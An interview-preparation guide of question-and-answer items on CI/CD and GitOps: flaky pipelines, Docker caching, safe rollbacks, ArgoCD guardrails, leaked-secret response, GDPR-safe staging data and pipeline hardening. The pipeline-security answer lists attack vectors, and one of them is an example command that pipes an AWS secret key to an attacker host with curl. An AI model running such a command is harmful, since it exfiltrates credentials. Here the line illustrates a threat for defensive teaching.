# CI/CD & GitOps — Production Tricky Interview Q&A

## Table of Contents
1. [Pipeline Failures & Debugging](#pipeline-failures--debugging)
2. [Rollback Strategies in Production](#rollback-strategies-in-production)
3. [GitOps Patterns (ArgoCD/Flux)](#gitops-patterns-argocdflux)
4. [Secrets Management in Pipelines](#secrets-management-in-pipelines)
5. [Multi-Environment Promotion](#multi-environment-promotion)
6. [Pipeline Security & Compliance](#pipeline-security--compliance)

---

## Pipeline Failures & Debugging

---

**Q1: Your CI/CD pipeline has been flaky for weeks — passing 80% of the time, failing 20% with random test failures. The team is ignoring failures and merging anyway. How do you fix this cultural AND technical problem?**

**A:**

**Technical investigation:**
```bash
# Step 1: Identify flaky tests
# Collect last 50 pipeline runs and find tests that sometimes pass/fail
grep -l "FAILED" build-logs/*.log | xargs grep "Test.*FAILED" | sort | uniq -c | sort -rn
# Output: tests that fail most often = likely flaky

# Step 2: Categorize flakiness causes
# Timing-dependent:
- Tests relying on sleep/setTimeout instead of proper waits
- Race conditions in async code
- Tests depending on execution order

# Environment-dependent:
- Tests assuming specific timezone/locale
- Tests depending on network calls (external APIs)
- Tests hitting shared databases (data pollution between tests)

# Resource-dependent:
- Tests failing under memory pressure (CI has less RAM than local)
- Tests timing out due to CPU throttling in CI containers
- Docker-in-Docker tests failing due to insufficient disk
```

**Fix the flaky tests:**
```yaml
# Strategy 1: Quarantine flaky tests (don't ignore, isolate)
# pytest: mark flaky tests
@pytest.mark.flaky(reruns=3, reruns_delay=2)
def test_intermittent_api_call():
    ...

# Strategy 2: Split pipeline into required + informational
# .github/workflows/ci.yml
jobs:
  required-tests:
    # These MUST pass for merge
    runs-on: ubuntu-latest
    steps:
      - run: pytest tests/ -m "not flaky" --strict-markers
  
  flaky-tests:
    # Informational only — tracked but doesn't block
    runs-on: ubuntu-latest
    continue-on-error: true
    steps:
      - run: pytest tests/ -m "flaky" --reruns 3

# Strategy 3: Test isolation
# Each test gets its own database schema
# Each test starts fresh Docker containers
# No shared state between test functions
```

**Fix the culture:**
```
1. Make pipeline results VISIBLE (Slack notifications, dashboard)
2. Implement "merge queue" — only green pipelines can merge
3. Track flaky test metrics: which tests, how often, who owns them
4. Assign flaky test cleanup as sprint work (not "when we have time")
5. Block merges on RED pipeline (GitHub branch protection):
   required_status_checks:
     strict: true  # Branch must be up-to-date before merge
6. Set SLO: "Pipeline must be green 95% of the time"
   Track and alert when below threshold
```

**Tricky**: The real answer interviewers want: "I wouldn't just fix the tests — I'd fix the system that allows people to ignore failing tests." The technical fix is easy. The cultural fix (making the team care about pipeline health) is what separates senior engineers from mid-level.

---


**Q2: Your Docker build in CI takes 25 minutes. Developers are frustrated. The Dockerfile is already using multi-stage builds. How do you get it under 5 minutes?**

**A:**

**Audit the slow points:**
```bash
# Add timing to Docker build
DOCKER_BUILDKIT=1 docker build --progress=plain . 2>&1 | grep -E "^#[0-9]+ DONE"
# Shows time per layer — find the bottleneck

# Common time wasters:
# 1. Downloading dependencies every build (no cache)
# 2. Building from scratch (no layer cache between CI runs)
# 3. Large context (sending GB of files to Docker daemon)
# 4. Running tests inside Docker build
# 5. Base image pull (large images, not cached)
```

**Optimization strategies:**
```dockerfile
# BEFORE (25 minutes):
FROM node:18
WORKDIR /app
COPY . .                       # Busts cache on ANY file change
RUN npm ci                     # 8 minutes (downloads everything)
RUN npm run build              # 5 minutes
RUN npm test                   # 10 minutes

# AFTER (4 minutes):
# syntax=docker/dockerfile:1.4
FROM node:18-alpine AS deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN --mount=type=cache,target=/root/.npm \
    npm ci                     # 30s (cached npm packages persist between builds!)

FROM deps AS build
COPY . .
RUN npm run build              # 2 min (only if source changed)

FROM node:18-alpine AS production
WORKDIR /app
COPY --from=build /app/dist ./dist
COPY --from=deps /app/node_modules ./node_modules
USER 1000
CMD ["node", "dist/server.js"]
```

**CI-level optimizations:**
```yaml
# GitHub Actions with Docker layer caching
- name: Set up Docker Buildx
  uses: docker/setup-buildx-action@v3

- name: Build and push
  uses: docker/build-push-action@v5
  with:
    context: .
    push: true
    tags: myapp:${{ github.sha }}
    cache-from: type=gha          # GitHub Actions cache
    cache-to: type=gha,mode=max   # Cache ALL layers, not just final
    
# Alternative: Use remote cache (ECR)
    cache-from: type=registry,ref=123456.dkr.ecr.us-east-1.amazonaws.com/myapp:cache
    cache-to: type=registry,ref=123456.dkr.ecr.us-east-1.amazonaws.com/myapp:cache
```

**The nuclear option (for monorepos):**
```bash
# Only build if relevant files changed
CHANGED_FILES=$(git diff --name-only HEAD~1)
if echo "$CHANGED_FILES" | grep -q "^services/api/"; then
  docker build -t api ./services/api
else
  echo "No changes to API service, skipping build"
  docker pull 123456.dkr.ecr.us-east-1.amazonaws.com/api:latest
fi
```

**Tricky**: `RUN --mount=type=cache` keeps the npm/pip/maven cache BETWEEN builds without putting it in a layer. This means `npm ci` only downloads NEW packages. But this only works with BuildKit and the cache is local to the CI runner. If you use ephemeral CI runners (new machine each build), you need remote caching (registry-based or GitHub Actions cache). Also, `.dockerignore` is critical — if you're sending `node_modules/`, `.git/`, or test fixtures to the Docker daemon, that alone can take 2-3 minutes.

---

**Q3: A deployment succeeded in CI/CD (green pipeline, passed all checks), but production is serving 500 errors. The pipeline shows "deployment successful." What's the gap in your pipeline?**

**A:**

**Why "deployment successful" ≠ "application working":**
```
Pipeline checks that PASSED:
✅ Unit tests pass
✅ Integration tests pass  
✅ Docker image builds
✅ Image pushed to registry
✅ Kubernetes deployment applied
✅ Pods are Running (status check)

What was NOT checked:
❌ Application actually handles requests correctly
❌ Database migrations completed
❌ External dependencies reachable
❌ Feature flags configured correctly
❌ Environment variables set correctly in production
❌ Certificate/secrets not expired
```

**The missing piece — post-deployment verification:**
```yaml
# Add smoke tests AFTER deployment
deploy-production:
  steps:
    - name: Deploy
      run: kubectl apply -f k8s/

    - name: Wait for rollout
      run: kubectl rollout status deployment/myapp --timeout=300s

    - name: Post-deployment smoke tests (THE MISSING STEP)
      run: |
        # Wait for new pods to be ready
        sleep 30
        
        # Test actual production endpoints
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" https://api.production.com/health)
        if [ "$HTTP_CODE" != "200" ]; then
          echo "SMOKE TEST FAILED! Rolling back..."
          kubectl rollout undo deployment/myapp
          exit 1
        fi
        
        # Test critical user flows
        RESPONSE=$(curl -s https://api.production.com/v1/products?limit=1)
        if ! echo "$RESPONSE" | jq -e '.data | length > 0' > /dev/null; then
          echo "Products endpoint returning empty! Rolling back..."
          kubectl rollout undo deployment/myapp
          exit 1
        fi

    - name: Monitor error rate (5 minutes)
      run: |
        # Query monitoring for error rate spike
        ERROR_RATE=$(curl -s "http://prometheus:9090/api/v1/query?query=rate(http_errors_total[5m])" | jq '.data.result[0].value[1]')
        if (( $(echo "$ERROR_RATE > 0.05" | bc -l) )); then
          echo "Error rate above 5%! Auto-rollback..."
          kubectl rollout undo deployment/myapp
          exit 1
        fi
```

**Progressive delivery pipeline (production-grade):**
```yaml
# ArgoCD Rollout with automatic analysis
apiVersion: argoproj.io/v1alpha1
kind: Rollout
spec:
  strategy:
    canary:
      steps:
      - setWeight: 5
      - analysis:
          templates:
          - templateName: success-rate
          - templateName: latency-check
      - pause: {duration: 5m}
      - setWeight: 50
      - analysis:
          templates:
          - templateName: success-rate
      - pause: {duration: 10m}
      - setWeight: 100
---
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata:
  name: success-rate
spec:
  metrics:
  - name: success-rate
    interval: 1m
    successCondition: result[0] >= 0.95
    provider:
      prometheus:
        address: http://prometheus:9090
        query: |
          sum(rate(http_requests_total{status=~"2.."}[5m]))
          /
          sum(rate(http_requests_total[5m]))
```

**Tricky**: `kubectl rollout status` only checks that pods are RUNNING (container started, readiness probe passed). It does NOT verify the application is functioning correctly. A pod can be "Ready" while serving 500 errors because the readiness probe hits `/healthz` which returns 200, but the actual `/api/products` endpoint fails because database migrations haven't completed. Your readiness probe must check REAL functionality, not just "process is alive."

---


## Rollback Strategies in Production

---

**Q4: Your deployment includes both application code changes AND a database migration (adding a new column, dropping an old one). The deployment succeeds but causes performance issues. You need to rollback. But the old code expects the old schema. How do you handle this?**

**A:**

**The problem:**
```
Version 1 (current):
- Code reads column: "user_email" 
- DB schema: table users has "user_email" column

Version 2 (deployed):
- Code reads column: "email" (renamed)
- Migration: RENAME "user_email" TO "email"
- Migration: DROP old column

ROLLBACK to Version 1?
- Code expects "user_email" column
- But column is now "email" (or DROPPED!)
- Application CRASHES harder than the performance issue!
```

**The expand-contract pattern (production standard):**
```
Phase 1 - EXPAND (deploy FIRST, safe to rollback):
- Add new column "email"
- Keep old column "user_email" 
- Code writes to BOTH columns
- Code reads from OLD column (user_email)
- Deploy and verify

Phase 2 - MIGRATE (data backfill):
- Copy all data: UPDATE users SET email = user_email WHERE email IS NULL
- Verify data consistency
- STILL safe to rollback (both columns exist)

Phase 3 - CONTRACT (after verification period):
- Code reads from NEW column (email)
- Code stops writing to old column
- Deploy and verify
- Still safe to rollback if you keep writing to both

Phase 4 - CLEANUP (separate deploy, days/weeks later):
- Drop old column "user_email"
- Now committed — rollback past this point requires data recovery
```

**Implementation:**
```sql
-- Migration 1 (expand): SAFE, backward compatible
ALTER TABLE users ADD COLUMN email VARCHAR(255);
CREATE INDEX idx_users_email ON users(email);
UPDATE users SET email = user_email WHERE email IS NULL;  -- Backfill

-- Code Version 2: Write to both, read from new
INSERT INTO users (user_email, email, ...) VALUES ($1, $1, ...);
SELECT email FROM users WHERE id = $1;  -- Read new

-- Wait 1 week, verify everything works

-- Migration 2 (contract): Point of no easy return
ALTER TABLE users DROP COLUMN user_email;
```

**For Kubernetes deployments:**
```yaml
# Use database migration as a separate Job (not in app deployment)
apiVersion: batch/v1
kind: Job
metadata:
  name: db-migration-v2
  annotations:
    argocd.argoproj.io/hook: PreSync  # Run BEFORE app deployment
spec:
  template:
    spec:
      containers:
      - name: migrate
        image: myapp:v2
        command: ["python", "manage.py", "migrate"]
      restartPolicy: Never
  backoffLimit: 0  # Don't retry migrations!
```

**Tricky**: NEVER combine schema-breaking migrations with application deployments in the same release. The golden rule: every deployment must be backward-compatible with N-1 version. If you can't rollback safely, you're one bad deploy away from extended downtime. Also, `ALTER TABLE` on large tables (100M+ rows) in PostgreSQL acquires an ACCESS EXCLUSIVE lock — blocking ALL reads and writes. Use tools like `pg_repack` or `gh-ost` (MySQL) for lock-free schema changes in production.

---

**Q5: You need to rollback a production deployment, but the new version has been running for 6 hours. During those 6 hours, users created data using new API fields that the old version doesn't understand. How do you rollback without losing user data?**

**A:**

**The data compatibility problem:**
```
New Version (6 hours in production):
- Added field: order.delivery_instructions (free text)
- 5,000 orders now have delivery_instructions data
- Old version doesn't know this field exists

Naive rollback:
- Old code ignores delivery_instructions field
- But does it? What if it does SELECT * and crashes on unknown column?
- What if it does UPDATE orders SET ... (without delivery_instructions) → sets to NULL?
- 5,000 customers lose their delivery instructions!
```

**Safe rollback strategy:**
```bash
# Step 1: Assess data impact BEFORE rolling back
kubectl exec -it myapp-pod -- python -c "
from app.models import Order
new_data_count = Order.objects.filter(delivery_instructions__isnull=False).count()
print(f'Orders with new field data: {new_data_count}')
# If 0 → safe to rollback without data concern
# If 5000 → need a plan
"

# Step 2: Make old version tolerant of new data
# Option A: Fix the old version to ignore unknown fields (quick patch)
# Add to V1 code: SELECT only known columns (not SELECT *)
# Deploy V1-patched instead of pure V1

# Option B: Rollback application but keep database schema
# - Rollback app to V1
# - Don't rollback database migration
# - New column stays but V1 code doesn't use it
# - Data is preserved for when V2 is fixed and redeployed

# Step 3: Data preservation
# Before rollback, snapshot the new data
pg_dump --table=orders --column-inserts prod-db > orders_backup.sql
kubectl cp orders_backup.sql backup-pod:/backups/pre-rollback-$(date +%s).sql
```

**Best practice — forward-fix vs rollback decision matrix:**
```
| Situation                  | Action        | Reason                          |
|----------------------------|---------------|---------------------------------|
| Bug found in 5 minutes     | ROLLBACK      | No data impact, fast recovery   |
| Bug found in 6 hours       | FORWARD-FIX   | Data created, rollback risky    |
| Security vulnerability     | ROLLBACK NOW  | Risk > data loss                |
| Performance degradation    | ROLLBACK      | Usually no data impact          |
| Data corruption happening  | ROLLBACK + DR | Stop the bleeding immediately   |
| Minor UI bug               | FORWARD-FIX   | Not worth rollback risk         |
```

**Tricky**: The decision to rollback vs forward-fix depends on: (1) How much new data was created? (2) Can old code handle new data? (3) How long will a fix take vs a rollback? In practice, after 2+ hours in production, forward-fix is usually safer than rollback because rollback introduces its own risks (data loss, state mismatch, user confusion). The exception: security vulnerabilities — always rollback immediately regardless of data impact.

---


## GitOps Patterns (ArgoCD/Flux)

---

**Q6: Your team adopted ArgoCD for GitOps. A developer committed a Kubernetes manifest with `replicas: 0` to the GitOps repo by accident. ArgoCD immediately synced it and scaled production to zero pods. How do you prevent this?**

**A:**

**Immediate recovery:**
```bash
# Option 1: Revert the commit in Git (GitOps way)
cd gitops-repo
git revert HEAD
git push origin main
# ArgoCD will sync the revert and scale back up

# Option 2: Override temporarily (break GitOps for emergency)
kubectl scale deployment/myapp --replicas=10
# But ArgoCD will REVERT this on next sync unless you:
argocd app set myapp --sync-policy none  # Disable auto-sync temporarily

# Option 3: ArgoCD UI — click "Sync" with manual override
```

**Prevention layers:**
```yaml
# Layer 1: Git branch protection + PR review
# NEVER allow direct push to main (GitOps repo)
# Require at least 1 approval for any manifest change

# Layer 2: OPA/Gatekeeper policy (cluster-side)
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sMinimumReplicas
metadata:
  name: minimum-replicas
spec:
  match:
    kinds:
    - apiGroups: ["apps"]
      kinds: ["Deployment"]
    namespaces: ["production"]
  parameters:
    minReplicas: 2  # Never allow less than 2 replicas in production

# Layer 3: ArgoCD sync waves and hooks
# Prevent immediate sync of dangerous changes
metadata:
  annotations:
    argocd.argoproj.io/sync-wave: "5"  # Sync later
    argocd.argoproj.io/sync-options: ApplyOutOfSyncOnly=true

# Layer 4: CI validation on GitOps repo
# .github/workflows/validate-manifests.yml
- name: Validate Kubernetes manifests
  run: |
    # Check for zero replicas
    for file in $(find . -name "*.yaml"); do
      REPLICAS=$(yq '.spec.replicas' "$file" 2>/dev/null)
      if [ "$REPLICAS" = "0" ]; then
        echo "ERROR: $file has replicas: 0!"
        exit 1
      fi
    done
    
    # Run kube-score for best practices
    kube-score score *.yaml --output-format ci

    # Run conftest with OPA policies
    conftest test *.yaml --policy policies/
```

**ArgoCD safety configuration:**
```yaml
# ArgoCD Application with safety guards
apiVersion: argoproj.io/v1alpha1
kind: Application
spec:
  syncPolicy:
    automated:
      prune: false        # Don't auto-delete resources
      selfHeal: true      # Revert manual kubectl changes
      allowEmpty: false   # Prevent sync if no resources found (accidental delete)
    syncOptions:
    - Validate=true       # Validate manifests before applying
    - CreateNamespace=false  # Don't create namespaces accidentally
    retry:
      limit: 3
      backoff:
        duration: 5s
        factor: 2
```

**Tricky**: With GitOps, Git is your single source of truth. That means a BAD commit = immediate production impact (if auto-sync is enabled). This is the double-edged sword of GitOps: it's great for audit trails and rollbacks, but a typo in YAML can take down production in seconds. Always: (1) disable auto-sync for production apps OR (2) require manual sync approval for production OR (3) have cluster-side policies (Gatekeeper/Kyverno) that reject dangerous configurations regardless of what Git says.

---

**Q7: Your ArgoCD setup manages 200 microservices. An engineer updates the base Helm chart (used by all services). ArgoCD detects 200 apps are "out of sync." If you sync all at once, you risk cascading failures. How do you handle mass updates safely?**

**A:**

**The problem:**
```
Shared Helm chart update (e.g., sidecar version bump):
- 200 apps detected as OutOfSync
- Syncing all = 200 simultaneous deployments
- If new sidecar has a bug → ALL 200 services affected
- If resource limits changed → cluster-wide resource pressure
```

**Progressive rollout strategy:**
```yaml
# Strategy 1: ApplicationSets with progressive sync
apiVersion: argoproj.io/v1alpha1
kind: ApplicationSet
spec:
  generators:
  - list:
      elements:
      - cluster: production
        service: canary-service-1    # Deploy to canary first
        wave: "1"
      - cluster: production
        service: low-risk-service
        wave: "2"
      - cluster: production
        service: critical-service
        wave: "3"
  strategy:
    type: RollingSync
    rollingSync:
      steps:
      - matchExpressions:
        - key: wave
          operator: In
          values: ["1"]
        maxUpdate: 1          # One at a time in wave 1
      - matchExpressions:
        - key: wave
          operator: In
          values: ["2"]
        maxUpdate: 10         # 10 at a time in wave 2
      - matchExpressions:
        - key: wave
          operator: In
          values: ["3"]
        maxUpdate: 50         # 50 at a time in wave 3

# Strategy 2: Manual wave-based approach
# Step 1: Update chart version for tier-1 apps only (canaries)
# Step 2: Monitor for 1 hour
# Step 3: Update chart version for tier-2 apps
# Step 4: Monitor for 1 hour  
# Step 5: Update remaining apps
```

**Automated progressive rollout script:**
```bash
#!/bin/bash
# progressive-sync.sh — Sync 200 apps in waves

APPS=$(argocd app list -o name)
WAVE_SIZE=10
WAVE_PAUSE=300  # 5 minutes between waves

echo "$APPS" | shuf | while readarray -n $WAVE_SIZE batch; do
  for app in "${batch[@]}"; do
    echo "Syncing: $app"
    argocd app sync "$app" --async
  done
  
  echo "Wave complete. Waiting ${WAVE_PAUSE}s for stabilization..."
  sleep $WAVE_PAUSE
  
  # Check cluster health before next wave
  UNHEALTHY=$(argocd app list --status Degraded -o name | wc -l)
  if [ "$UNHEALTHY" -gt 5 ]; then
    echo "TOO MANY UNHEALTHY APPS ($UNHEALTHY). STOPPING!"
    echo "Investigate before continuing."
    exit 1
  fi
done
```

**Tricky**: Helm chart updates are the "blast radius amplifier" of GitOps. One bad chart change affects EVERY service using it. Prevention: (1) Pin chart versions per service (don't use `latest` or floating references), (2) Use Renovate/Dependabot to create individual PRs per service for chart updates, (3) Test chart changes in staging cluster first, (4) Have a "chart canary" — one non-critical service that always gets chart updates first and is monitored for 24h before promoting to others.

---


## Secrets Management in Pipelines

---

**Q8: A developer accidentally committed an AWS access key to a public GitHub repository. The commit was deleted 5 minutes later. Is the secret safe? What's your incident response?**

**A:**

**Is it safe? ABSOLUTELY NOT.**
```
Why deleting the commit doesn't help:
1. Git history still contains the commit (git reflog, force push doesn't delete from remotes immediately)
2. GitHub caches content — even "deleted" commits are accessible by SHA for days
3. Bots scan GitHub in REAL-TIME (within seconds of push)
4. The 5-minute window is MORE than enough for automated key scraping
5. GitHub itself scans and notifies AWS (GitHub Secret Scanning → AWS auto-revokes)

ASSUME THE KEY IS COMPROMISED. ALWAYS.
```

**Incident response (ordered by urgency):**
```bash
# MINUTE 0: Revoke the key immediately
aws iam delete-access-key --user-name compromised-user --access-key-id AKIAIOSFODNN7EXAMPLE

# Or if you can't delete yet, deactivate:
aws iam update-access-key --user-name compromised-user \
  --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive

# MINUTE 1: Create new key for the service
aws iam create-access-key --user-name compromised-user
# Update the service with new credentials

# MINUTE 2: Check for unauthorized usage
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAIOSFODNN7EXAMPLE \
  --start-time $(date -d '1 hour ago' --iso-8601=seconds) \
  --query 'Events[].[EventTime,EventName,SourceIPAddress]'

# Look for:
# - Unusual API calls (CreateUser, AttachPolicy, RunInstances)
# - Calls from unknown IPs
# - Lateral movement (IAM changes, new keys created)

# MINUTE 5: If unauthorized access detected
# - Revoke ALL sessions for the IAM user
# - Check for persistence mechanisms (new IAM users, roles, Lambda backdoors)
# - Check for crypto miners (EC2 instances in unusual regions)
aws ec2 describe-instances --region us-east-1 --query 'Reservations[].Instances[].InstanceId'
# Check ALL regions — attackers launch in obscure regions!
```

**Prevention (the real answer):**
```yaml
# 1. Pre-commit hooks (prevent commits with secrets)
# .pre-commit-config.yaml
repos:
- repo: https://github.com/gitleaks/gitleaks
  rev: v8.18.0
  hooks:
  - id: gitleaks

# 2. GitHub push protection (blocks pushes with secrets)
# Settings → Code security → Secret scanning → Push protection: ON

# 3. Never use long-lived credentials in CI/CD
# Use OIDC federation instead:
# GitHub Actions → AWS
- name: Configure AWS credentials
  uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456:role/GitHubActions
    aws-region: us-east-1
    # NO access keys! Uses short-lived STS tokens via OIDC

# 4. External Secrets Operator for Kubernetes
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: aws-secrets-manager
  data:
  - secretKey: db-password
    remoteRef:
      key: production/database
      property: password
```

**Tricky**: AWS has an automatic response to GitHub secret scanning — when GitHub detects an AWS key in a public repo, they notify AWS, and AWS can automatically quarantine the key (depending on account settings). But this takes minutes, and sophisticated attackers have automation that scrapes new commits in SECONDS. There are documented cases of crypto miners being launched within 30 seconds of a key being pushed to GitHub. The only safe approach: assume compromise the moment it's pushed, revoke immediately, and investigate.

---

## Multi-Environment Promotion

---

**Q9: Design a promotion pipeline: Dev → Staging → Production. The tricky requirement: staging must use production-like data but comply with GDPR (no real customer PII). How do you handle this?**

**A:**

**Pipeline architecture:**
```
Developer pushes code
    ↓
CI Pipeline (build + unit tests)
    ↓ Artifact: Docker image tagged with SHA
Dev Environment (auto-deploy on merge to main)
    ↓ Manual approval OR automated test gate
Staging Environment (production-like)
    ↓ Load tests + integration tests + manual QA
    ↓ Required approvals (2 engineers + 1 QA)
Production (canary → progressive rollout)
```

**GDPR-compliant staging data:**
```bash
# Strategy: Anonymized production data snapshot

# Step 1: Restore RDS snapshot to staging
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier staging-db \
  --db-snapshot-identifier prod-daily-snapshot

# Step 2: Run anonymization BEFORE making data available
psql -h staging-db -c "
  -- Anonymize PII
  UPDATE users SET 
    email = 'user_' || id || '@example.com',
    first_name = 'User',
    last_name = 'Number' || id,
    phone = '+1555' || LPAD(id::text, 7, '0'),
    address = '123 Test Street, City, ST 12345',
    date_of_birth = '1990-01-01',
    ssn = NULL,
    ip_address = '192.168.1.' || (id % 255);

  -- Preserve data patterns (order volume, dates, amounts)  
  -- but remove identifying info
  UPDATE orders SET
    shipping_address = '456 Staging Ave, Test City, ST 99999',
    customer_notes = 'Anonymized for staging';

  -- Delete truly sensitive tables
  TRUNCATE TABLE payment_methods;
  TRUNCATE TABLE audit_logs;
  TRUNCATE TABLE user_sessions;

  -- Verify no PII remains
  SELECT COUNT(*) FROM users WHERE email NOT LIKE '%@example.com';
  -- Must return 0!
"

# Step 3: Create a view-only role for staging access
GRANT SELECT ON ALL TABLES IN SCHEMA public TO staging_readonly;
```

**Automated promotion with gates:**
```yaml
# GitHub Actions promotion pipeline
name: Promote to Production
on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Version to promote (SHA or tag)'
        required: true

jobs:
  validate-staging:
    runs-on: ubuntu-latest
    steps:
    - name: Verify version ran in staging for 24h+
      run: |
        STAGING_DEPLOY_TIME=$(kubectl --context staging get deployment myapp \
          -o jsonpath='{.metadata.annotations.deploy-time}')
        HOURS_IN_STAGING=$(( ($(date +%s) - STAGING_DEPLOY_TIME) / 3600 ))
        if [ "$HOURS_IN_STAGING" -lt 24 ]; then
          echo "Version must soak in staging for 24+ hours. Current: ${HOURS_IN_STAGING}h"
          exit 1
        fi

    - name: Verify no staging errors
      run: |
        ERROR_COUNT=$(curl -s "http://prometheus-staging/api/v1/query?query=sum(increase(http_errors_total[24h]))" | jq '.data.result[0].value[1]')
        if [ "$ERROR_COUNT" -gt 100 ]; then
          echo "Too many errors in staging: $ERROR_COUNT"
          exit 1
        fi

  deploy-production:
    needs: validate-staging
    environment: production  # Requires manual approval in GitHub
    runs-on: ubuntu-latest
    steps:
    - name: Deploy to production
      run: |
        # Update GitOps repo with new version
        cd gitops-repo
        yq -i '.spec.template.spec.containers[0].image = "myapp:${{ inputs.version }}"' \
          apps/production/deployment.yaml
        git commit -am "Promote ${{ inputs.version }} to production"
        git push
```

**Tricky**: The GDPR anonymization must be IRREVERSIBLE. If you just replace emails with `user_1@example.com`, and the original IDs are preserved, someone could potentially re-identify users by joining with other data sources. True GDPR compliance requires: (1) Consistent pseudonymization (same user always gets same fake data — enables testing of user journeys), (2) No way to reverse the mapping, (3) Documented data processing agreement for staging, (4) Access controls on staging as strict as production.

---


## Pipeline Security & Compliance

---

**Q10: Your CI/CD pipeline has access to production AWS credentials, Kubernetes clusters, and Docker registries. A malicious PR could exfiltrate these secrets. How do you secure the pipeline itself?**

**A:**

**Attack vectors in CI/CD pipelines:**
```
1. Malicious PR: Attacker modifies pipeline YAML to echo secrets
   - runs: echo $AWS_SECRET_ACCESS_KEY | curl attacker.com -d @-
   
2. Dependency confusion: Malicious npm/pip package runs in CI
   - package.json: "my-company-internal-lib": "^99.0.0" (attacker publishes higher version to public registry)
   
3. Build script injection: Makefile/build.gradle executes arbitrary code
   - Compromised dependency runs during build phase
   
4. Docker image poisoning: Base image compromised
   - FROM node:18 → registry returns malicious image
   
5. Self-hosted runner compromise: Previous build left malware on runner
   - Persistent agent → steals secrets from next build
```

**Pipeline security hardening:**
```yaml
# 1. Separate pipelines for PRs vs main branch
# PR pipeline: NO access to secrets, runs in sandbox
# Main pipeline: Has secrets, only runs on merged code

# GitHub Actions:
on:
  pull_request:
    # PR events use read-only GITHUB_TOKEN
    # No access to repository secrets
    # Runs in isolated environment

# 2. Pin ALL actions by SHA (not tag)
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
  # Tags can be moved to malicious code. SHAs are immutable.

# 3. Minimal permissions
permissions:
  contents: read    # Only what's needed
  packages: write   # If pushing to registry
  # Don't use: permissions: write-all

# 4. Ephemeral runners (fresh machine per build)
runs-on: ubuntu-latest  # GitHub-hosted = destroyed after job
# Self-hosted? Use ephemeral: --ephemeral flag (one job, then terminated)

# 5. Network isolation for runners
# Block all outbound except:
# - Package registries (npm, pip, maven)
# - Docker registries (ECR, Docker Hub)
# - Your infrastructure endpoints
# Block: all other IPs (prevents exfiltration)
```

**OIDC Federation (eliminate long-lived credentials entirely):**
```yaml
# Instead of storing AWS_ACCESS_KEY in CI secrets:
permissions:
  id-token: write  # Required for OIDC

- name: Configure AWS credentials via OIDC
  uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456:role/ci-deploy
    aws-region: us-east-1
    # HOW IT WORKS:
    # 1. GitHub generates a short-lived JWT token
    # 2. AWS STS validates the token (trusts GitHub OIDC provider)
    # 3. Returns temporary credentials (15 min TTL)
    # 4. No stored secrets! If pipeline YAML is leaked, attacker gets nothing
```

**Supply chain security:**
```bash
# 1. Lock dependencies (use lockfiles)
npm ci         # Not npm install (respects lockfile exactly)
pip install -r requirements.txt --require-hashes  # Verify package integrity

# 2. Private registry mirror (don't pull from public during build)
# All packages go through: Artifactory/Nexus/CodeArtifact
# Scan before allowing into mirror
npm config set registry https://company.jfrog.io/artifactory/api/npm/npm-mirror/

# 3. SBOM (Software Bill of Materials)
# Generate SBOM for every build
syft packages ./app -o cyclonedx-json > sbom.json
# Scan SBOM for vulnerabilities
grype sbom:sbom.json --fail-on critical

# 4. Image signing (only deploy signed images)
cosign sign --key cosign.key myregistry/myapp:v1.2.3
# Kubernetes admission controller verifies signature before allowing deployment
```

**Tricky**: The most dangerous CI/CD attack vector isn't external hackers — it's **supply chain attacks via dependencies**. The SolarWinds and Codecov breaches both exploited CI/CD pipelines. A compromised `actions/checkout` or a malicious npm package running in your build context has FULL access to your production credentials. Pin actions by SHA, use private dependency mirrors, and run builds in network-isolated environments. The convenience of `uses: some-action@latest` is a security risk.

---

**Q11: Your pipeline deploys to production automatically on merge to main. Legal requires that every production deployment must be traceable to an approved change request. How do you implement compliance without slowing developers down?**

**A:**

**Automated compliance pipeline:**
```yaml
# Every merge to main = automatic Jira/ServiceNow ticket
name: Compliant Deploy
on:
  push:
    branches: [main]

jobs:
  create-change-record:
    runs-on: ubuntu-latest
    outputs:
      change-id: ${{ steps.create-cr.outputs.id }}
    steps:
    - name: Create Change Record
      id: create-cr
      run: |
        # Auto-create change record from PR metadata
        PR_TITLE=$(gh pr list --state merged --limit 1 --json title -q '.[0].title')
        PR_AUTHOR=$(gh pr list --state merged --limit 1 --json author -q '.[0].author.login')
        PR_REVIEWERS=$(gh pr list --state merged --limit 1 --json reviews -q '.[0].reviews[].author.login')
        
        CR_ID=$(curl -X POST https://servicenow.company.com/api/change_request \
          -d "{
            \"title\": \"Deploy: $PR_TITLE\",
            \"requester\": \"$PR_AUTHOR\",
            \"approver\": \"$PR_REVIEWERS\",
            \"type\": \"standard\",
            \"risk\": \"low\",
            \"evidence\": \"PR #$(gh pr list --state merged --limit 1 --json number -q '.[0].number')\"
          }" | jq -r '.id')
        echo "id=$CR_ID" >> $GITHUB_OUTPUT

  deploy:
    needs: create-change-record
    steps:
    - name: Deploy with audit trail
      run: |
        kubectl annotate deployment myapp \
          "change-record=${{ needs.create-change-record.outputs.change-id }}" \
          "deployed-by=pipeline" \
          "git-sha=${{ github.sha }}" \
          "pr-number=$(gh pr list --state merged --limit 1 --json number -q '.[0].number')" \
          --overwrite
        kubectl apply -f k8s/

    - name: Close Change Record
      if: success()
      run: |
        curl -X PATCH https://servicenow.company.com/api/change_request/${{ needs.create-change-record.outputs.change-id }} \
          -d '{"state": "closed", "close_code": "successful"}'
```

**The compliance chain:**
```
PR Created → PR Reviewed (evidence of approval) → 
PR Merged → Change Record Auto-Created → 
Pipeline Deploys → Deployment Annotated → 
Change Record Closed

Audit trail:
- WHO: PR author + reviewers (GitHub)
- WHAT: Code diff (Git)  
- WHEN: Deployment timestamp (pipeline)
- WHY: PR description + linked Jira ticket
- HOW: Pipeline run ID + logs
- APPROVED BY: PR reviewers = change approvers
```

